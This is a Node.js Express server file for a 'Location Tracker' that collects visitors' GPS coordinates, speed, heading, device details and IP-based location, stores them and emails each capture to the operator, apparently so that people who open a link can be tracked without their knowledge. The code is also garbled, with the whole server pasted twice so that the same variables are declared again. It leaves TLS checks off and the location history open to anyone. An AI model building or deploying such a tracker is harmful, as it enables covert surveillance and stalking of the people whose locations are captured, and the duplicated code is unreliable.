// server.js
const express = require('express');
const cors = require('cors');
const path = require('path');
const nodemailer = require('nodemailer');
require('dotenv').config();

// Handle fetch for Node.js versions
let fetch;
try {
    fetch = globalThis.fetch || require('node-fetch');
} catch {
    fetch = globalThis.fetch;
}// server.js
const express = require('express');
const cors = require('cors');
const path = require('path');
const nodemailer = require('nodemailer');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors({ origin: '*' }));
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));
app.use(express.static('public'));

// Store latest location
let latestLocation = null;
let locationHistory = [];

// Email Configuration
const transporter = nodemailer.createTransport({
    host: 'smtp.gmail.com',
    port: 465,
    secure: true,
    auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS
    },
    tls: { rejectUnauthorized: false },
    connectionTimeout: 5000,
    greetingTimeout: 5000,
    socketTimeout: 5000
});

transporter.verify((error) => {
    if (error) {
        console.error('❌ Email error:', error.message);
    } else {
        console.log('✅ Email server ready!');
    }
});

// ===== ROUTES =====

// Serve main page
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Health check
app.get('/health', (req, res) => {
    res.json({
        status: 'ok',
        timestamp: new Date().toISOString(),
        uptime: process.uptime(),
        locationCount: locationHistory.length,
        hasLocation: !!latestLocation
    });
});

// API config
app.get('/api/config', (req, res) => {
    const protocol = req.headers['x-forwarded-proto'] || req.protocol || 'https';
    const host = req.headers['host'] || 'localhost:3000';
    res.json({
        success: true,
        data: {
            baseUrl: `${protocol}://${host}`,
            isProduction: process.env.NODE_ENV === 'production'
        }
    });
});

// Get latest location
app.get('/api/latest-location', (req, res) => {
    res.json({
        success: !!latestLocation,
        data: latestLocation || null
    });
});

// FAST IP LOCATION - <1 second
app.get('/api/ip-location', async (req, res) => {
    try {
        let clientIP = req.headers['x-forwarded-for']?.split(',')[0] || 
                       req.connection.remoteAddress || 
                       req.ip;

        if (clientIP.startsWith('::ffff:')) {
            clientIP = clientIP.substring(7);
        }

        // Handle localhost
        if (clientIP === '::1' || clientIP === '127.0.0.1' || clientIP === 'localhost') {
            return res.json({
                success: true,
                data: {
                    latitude: 40.7128,
                    longitude: -74.0060,
                    city: 'New York (Test)',
                    country: 'US',
                    accuracy: 'IP-based',
                    source: 'IP (Test)'
                }
            });
        }

        console.log(`📍 IP Location for: ${clientIP}`);
        
        // Super fast API call with timeout
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 3000);
        
        const response = await fetch(`http://ip-api.com/json/${clientIP}?fields=status,lat,lon,city,country,query`, {
            signal: controller.signal
        });
        clearTimeout(timeoutId);
        
        const data = await response.json();

        if (data.status === 'success') {
            res.json({
                success: true,
                data: {
                    latitude: data.lat,
                    longitude: data.lon,
                    city: data.city || 'Unknown',
                    country: data.country || 'Unknown',
                    ip: data.query,
                    accuracy: 'IP-based',
                    source: 'IP'
                }
            });
        } else {
            // Fallback location if API fails
            res.json({
                success: true,
                data: {
                    latitude: 40.7128,
                    longitude: -74.0060,
                    city: 'Unknown',
                    country: 'Unknown',
                    accuracy: 'IP-based (fallback)',
                    source: 'IP (Fallback)'
                }
            });
        }
    } catch (error) {
        console.error('IP location error:', error);
        // Always return a location even if API fails
        res.json({
            success: true,
            data: {
                latitude: 40.7128,
                longitude: -74.0060,
                city: 'Unknown',
                country: 'Unknown',
                accuracy: 'IP-based (error fallback)',
                source: 'IP (Error)'
            }
        });
    }
});

// FAST TRACK LOCATION - Responds immediately, email async
app.post('/api/track-location', async (req, res) => {
    console.log('📍 Track location endpoint hit');
    
    try {
        const { latitude, longitude, accuracy, source, userAgent, autoFetched } = req.body;

        if (!latitude || !longitude) {
            return res.status(400).json({ 
                success: false, 
                message: 'Missing coordinates' 
            });
        }

        console.log(`📍 Location: ${latitude}, ${longitude}`);

        const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
        const timestamp = new Date().toLocaleString();

        // Store location
        const locationData = {
            latitude,
            longitude,
            accuracy: accuracy || 0,
            source: source || 'IP',
            autoFetched: autoFetched || false,
            timestamp: new Date().toISOString(),
            mapsLink
        };
        
        latestLocation = locationData;
        locationHistory.push({ ...locationData, capturedAt: new Date().toISOString() });

        // Send email in background (don't wait)
        sendEmailAsync(locationData, userAgent);

        // Respond immediately (<100ms)
        res.json({ 
            success: true, 
            message: 'Location tracked!',
            mapsLink: mapsLink,
            location: locationData
        });

    } catch (error) {
        console.error('❌ Error:', error);
        res.status(500).json({ 
            success: false, 
            message: error.message 
        });
    }
});

// Async email function (runs in background)
async function sendEmailAsync(locationData, userAgent) {
    try {
        const { latitude, longitude, accuracy, source, autoFetched, mapsLink } = locationData;
        const timestamp = new Date().toLocaleString();

        const emailHtml = `
            <!DOCTYPE html>
            <html>
            <head>
                <style>
                    body { font-family: Arial; max-width: 600px; margin: 0 auto; padding: 20px; background: #f4f4f4; }
                    .container { background: white; border-radius: 10px; padding: 30px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
                    .header { background: linear-gradient(135deg, #28a745 0%, #20c997 100%); color: white; padding: 20px; border-radius: 10px 10px 0 0; margin: -30px -30px 20px -30px; }
                    .header h1 { margin: 0; }
                    .badge { display: inline-block; background: #ffc107; color: #856404; padding: 4px 12px; border-radius: 12px; font-size: 12px; margin-top: 5px; }
                    .auto-badge { display: inline-block; background: #17a2b8; color: white; padding: 4px 12px; border-radius: 12px; font-size: 12px; margin-left: 5px; }
                    .info { background: #f8f9fa; padding: 20px; border-radius: 10px; margin: 20px 0; }
                    .info-row { display: flex; justify-content: space-between; padding: 10px; border-bottom: 1px solid #e9ecef; }
                    .info-row:last-child { border-bottom: none; }
                    .label { font-weight: bold; color: #495057; }
                    .value { color: #212529; }
                    .map-link { display: inline-block; background: #007bff; color: white; padding: 12px 25px; text-decoration: none; border-radius: 5px; margin: 10px 0; }
                    .footer { margin-top: 30px; text-align: center; color: #6c757d; font-size: 12px; border-top: 1px solid #dee2e6; padding-top: 20px; }
                </style>
            </head>
            <body>
                <div class="container">
                    <div class="header">
                        <h1>📍 Location Tracked</h1>
                        <p>${timestamp}</p>
                        <span class="badge">📡 ${source || 'IP'}</span>
                        ${autoFetched ? '<span class="auto-badge">🔄 Auto</span>' : ''}
                    </div>
                    <div class="info">
                        <div class="info-row"><span class="label">📍 Latitude:</span><span class="value">${latitude}</span></div>
                        <div class="info-row"><span class="label">📍 Longitude:</span><span class="value">${longitude}</span></div>
                        <div class="info-row"><span class="label">🎯 Accuracy:</span><span class="value">${accuracy || 'N/A'}m</span></div>
                    </div>
                    <div style="text-align: center;">
                        <a href="${mapsLink}" target="_blank" class="map-link">🗺️ View on Google Maps</a>
                    </div>
                    <div class="footer">
                        <p>📍 Location captured ${autoFetched ? 'automatically' : 'manually'}</p>
                    </div>
                </div>
            </body>
            </html>
        `;

        await transporter.sendMail({
            from: process.env.EMAIL_USER,
            to: process.env.EMAIL_TO,
            subject: `📍 ${autoFetched ? 'Auto' : 'Manual'} Location - ${timestamp}`,
            html: emailHtml,
            text: `Location: ${latitude}, ${longitude}\nAccuracy: ${accuracy || 'N/A'}m\nMaps: ${mapsLink}`
        });

        console.log(`✅ Email sent to ${process.env.EMAIL_TO}`);
    } catch (error) {
        console.error('❌ Email send error:', error.message);
    }
}

app.listen(PORT, () => {
    console.log(`\n🚀 Server running on port ${PORT}`);
    console.log(`📧 Email: ${process.env.EMAIL_USER} → ${process.env.EMAIL_TO}`);
    console.log(`📍 App: http://localhost:${PORT}\n`);
});

const app = express();
const PORT = process.env.PORT || 3000;

// CORS configuration - Allow all origins for Render
app.use(cors({
    origin: '*',
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization']
}));

// Middleware
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));
app.use(express.static('public'));

// Log all requests (for debugging)
app.use((req, res, next) => {
    console.log(`📨 ${req.method} ${req.url}`);
    next();
});

// Store latest location
let latestLocation = null;
let locationHistory = [];

// Email Configuration
const transporter = nodemailer.createTransport({
    host: 'smtp.gmail.com',
    port: 465,
    secure: true,
    auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS
    },
    tls: {
        rejectUnauthorized: false
    }
});

transporter.verify((error) => {
    if (error) {
        console.error('❌ Email error:', error.message);
    } else {
        console.log('✅ Email server ready!');
        console.log(`📧 From: ${process.env.EMAIL_USER}`);
        console.log(`📧 To: ${process.env.EMAIL_TO}`);
    }
});

// ===== ROUTES =====

// Serve main page
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Health check endpoint (useful for Render)
app.get('/health', (req, res) => {
    res.json({
        status: 'ok',
        timestamp: new Date().toISOString(),
        uptime: process.uptime(),
        locationCount: locationHistory.length,
        hasLocation: !!latestLocation,
        environment: process.env.NODE_ENV || 'development',
        renderUrl: process.env.RENDER_EXTERNAL_URL || 'not on render'
    });
});

// API config endpoint
app.get('/api/config', (req, res) => {
    const protocol = req.headers['x-forwarded-proto'] || req.protocol || 'https';
    const host = req.headers['host'] || 'localhost:3000';
    const baseUrl = `${protocol}://${host}`;
    
    res.json({
        success: true,
        data: {
            baseUrl: baseUrl,
            apiUrl: `${baseUrl}/api`,
            isProduction: process.env.NODE_ENV === 'production',
            renderUrl: process.env.RENDER_EXTERNAL_URL || null,
            timestamp: new Date().toISOString()
        }
    });
});

// Get latest location
app.get('/api/latest-location', (req, res) => {
    console.log('📡 Getting latest location');
    if (latestLocation) {
        res.json({
            success: true,
            data: latestLocation
        });
    } else {
        res.json({
            success: false,
            message: 'No location data available yet'
        });
    }
});

// Get location history
app.get('/api/location-history', (req, res) => {
    res.json({
        success: true,
        data: locationHistory.slice(-10)
    });
});

// Test email endpoint
app.get('/test-email', async (req, res) => {
    try {
        await transporter.sendMail({
            from: process.env.EMAIL_USER,
            to: process.env.EMAIL_TO,
            subject: '✅ Test Email - Location Tracker',
            text: 'Email configuration working on Render!'
        });
        res.json({ success: true, message: 'Test email sent!' });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// Get location from IP (fallback)
app.get('/api/get-location', async (req, res) => {
    try {
        let clientIP = req.headers['x-forwarded-for']?.split(',')[0] || 
                       req.connection.remoteAddress || 
                       req.ip;

        if (clientIP.startsWith('::ffff:')) {
            clientIP = clientIP.substring(7);
        }

        console.log(`📍 Getting location for IP: ${clientIP}`);

        const response = await fetch(`http://ip-api.com/json/${clientIP}?fields=status,lat,lon,city,regionName,country,query`);
        const data = await response.json();

        if (data.status === 'success') {
            const result = {
                ip: data.query,
                latitude: data.lat,
                longitude: data.lon,
                city: data.city,
                region: data.regionName,
                country: data.country,
                accuracy: 'IP-based (approx)',
                source: 'IP Fallback',
                googleMapsLink: `https://www.google.com/maps?q=${data.lat},${data.lon}`
            };
            
            latestLocation = result;
            locationHistory.push({ ...result, capturedAt: new Date().toISOString() });
            
            res.json({ success: true, data: result });
        } else {
            throw new Error('IP lookup failed');
        }
    } catch (error) {
        console.error('IP lookup error:', error);
        res.status(500).json({ success: false, message: error.message });
    }
});

// Track location endpoint - MAIN ENDPOINT
app.post('/api/track-location', async (req, res) => {
    console.log('📍 Track location endpoint hit!');
    console.log('📦 Request body:', req.body);
    
    try {
        const { 
            latitude, longitude, accuracy, altitude,
            speed, heading, source, userAgent, autoFetched 
        } = req.body;

        // Validate required fields
        if (!latitude || !longitude) {
            console.error('❌ Missing latitude or longitude');
            return res.status(400).json({ 
                success: false, 
                message: 'Missing latitude or longitude' 
            });
        }

        console.log(`📍 Location: ${latitude}, ${longitude}`);
        console.log(`🎯 Accuracy: ${accuracy || 'N/A'}m`);
        console.log(`🔄 Auto-fetched: ${autoFetched ? 'Yes' : 'No'}`);

        const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
        const timestamp = new Date().toLocaleString();

        const locationData = {
            latitude,
            longitude,
            accuracy: accuracy || 0,
            altitude: altitude || null,
            speed: speed || null,
            heading: heading || null,
            source: source || 'GPS',
            autoFetched: autoFetched || false,
            timestamp: new Date().toISOString(),
            mapsLink
        };
        
        // Store location
        latestLocation = locationData;
        locationHistory.push({ ...locationData, capturedAt: new Date().toISOString() });

        // Send email
        try {
            const emailHtml = `
                <!DOCTYPE html>
                <html>
                <head>
                    <style>
                        body { font-family: Arial; max-width: 600px; margin: 0 auto; padding: 20px; background: #f4f4f4; }
                        .container { background: white; border-radius: 10px; padding: 30px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
                        .header { background: linear-gradient(135deg, #28a745 0%, #20c997 100%); color: white; padding: 20px; border-radius: 10px 10px 0 0; margin: -30px -30px 20px -30px; }
                        .header h1 { margin: 0; }
                        .badge { display: inline-block; background: #ffc107; color: #856404; padding: 4px 12px; border-radius: 12px; font-size: 12px; margin-top: 5px; }
                        .auto-badge { display: inline-block; background: #17a2b8; color: white; padding: 4px 12px; border-radius: 12px; font-size: 12px; margin-left: 5px; }
                        .info { background: #f8f9fa; padding: 20px; border-radius: 10px; margin: 20px 0; }
                        .info-row { display: flex; justify-content: space-between; padding: 10px; border-bottom: 1px solid #e9ecef; }
                        .info-row:last-child { border-bottom: none; }
                        .label { font-weight: bold; color: #495057; }
                        .value { color: #212529; }
                        .map-link { display: inline-block; background: #007bff; color: white; padding: 12px 25px; text-decoration: none; border-radius: 5px; margin: 10px 0; }
                        .footer { margin-top: 30px; text-align: center; color: #6c757d; font-size: 12px; border-top: 1px solid #dee2e6; padding-top: 20px; }
                    </style>
                </head>
                <body>
                    <div class="container">
                        <div class="header">
                            <h1>📍 Device Location</h1>
                            <p>User visited on ${timestamp}</p>
                            <span class="badge">📡 ${source || 'GPS'}</span>
                            ${autoFetched ? '<span class="auto-badge">🔄 Auto-Fetched</span>' : ''}
                        </div>
                        <div class="info">
                            <div class="info-row"><span class="label">📅 Time:</span><span class="value">${timestamp}</span></div>
                            <div class="info-row"><span class="label">📍 Latitude:</span><span class="value">${latitude}</span></div>
                            <div class="info-row"><span class="label">📍 Longitude:</span><span class="value">${longitude}</span></div>
                            <div class="info-row"><span class="label">🎯 Accuracy:</span><span class="value">${accuracy || 'N/A'}m</span></div>
                            ${altitude ? `<div class="info-row"><span class="label">⛰️ Altitude:</span><span class="value">${altitude}m</span></div>` : ''}
                            ${speed ? `<div class="info-row"><span class="label">🏃 Speed:</span><span class="value">${speed} m/s</span></div>` : ''}
                            ${heading ? `<div class="info-row"><span class="label">🧭 Heading:</span><span class="value">${heading}°</span></div>` : ''}
                            <div class="info-row"><span class="label">📱 Device:</span><span class="value" style="font-size:12px;">${userAgent || 'Unknown'}</span></div>
                        </div>
                        <div style="text-align: center;">
                            <a href="${mapsLink}" target="_blank" class="map-link">🗺️ View on Google Maps</a>
                        </div>
                        <div class="footer">
                            <p>📍 Location captured ${autoFetched ? 'automatically' : 'manually'}</p>
                            <p style="font-size:11px;color:#888;">Powered by Location Tracker</p>
                        </div>
                    </div>
                </body>
                </html>
            `;

            await transporter.sendMail({
                from: process.env.EMAIL_USER,
                to: process.env.EMAIL_TO,
                subject: `📍 ${autoFetched ? 'Auto' : 'Manual'} Location - ${timestamp}`,
                html: emailHtml,
                text: `Location: ${latitude}, ${longitude}\nAccuracy: ${accuracy || 'N/A'}m\nMaps: ${mapsLink}`
            });

            console.log(`✅ Email sent to ${process.env.EMAIL_TO}`);
        } catch (emailError) {
            console.error('❌ Email error:', emailError.message);
            // Continue even if email fails - still return success for location
        }

        res.json({ 
            success: true, 
            message: 'Location tracked!',
            mapsLink: mapsLink,
            locationId: locationHistory.length
        });

    } catch (error) {
        console.error('❌ Server error:', error);
        res.status(500).json({ 
            success: false, 
            message: 'Internal server error',
            error: error.message 
        });
    }
});

// 404 handler
app.use((req, res) => {
    console.log('❌ 404:', req.url);
    res.status(404).json({ 
        success: false, 
        message: 'Endpoint not found' 
    });
});

// Error handler
app.use((err, req, res, next) => {
    console.error('❌ Unhandled error:', err);
    res.status(500).json({ 
        success: false, 
        message: 'Internal server error',
        error: err.message 
    });
});

app.listen(PORT, () => {
    console.log(`\n🚀 Server running on port ${PORT}`);
    console.log(`📧 Email: ${process.env.EMAIL_USER} → ${process.env.EMAIL_TO}`);
    console.log(`🔗 Health check: https://your-app.onrender.com/health`);
    console.log(`📍 API endpoint: https://your-app.onrender.com/api/track-location\n`);
});
